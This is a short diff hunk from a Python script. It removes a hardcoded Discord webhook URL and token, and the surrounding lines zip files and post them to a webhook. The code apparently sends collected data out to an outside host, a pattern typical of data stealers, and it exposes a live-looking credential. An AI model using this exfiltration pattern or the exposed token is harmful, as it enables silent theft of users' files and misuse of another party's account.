@@ -48,7 +48,6 @@ resp = requests.post(webhook_url, json={
     }]
 })
 
-webhook_url = 'https://discord.com/api/webhooks/1069971959179395082/OaX8LVPgy2U1c240ow7XeoqCJuGDdWXRhpBpJlr1ZbBCBO7XiLbI_kQhdYf6LHERu9QT'
 send_zip_to_webhook(create_zip_file(), webhook_url)
 
 try:
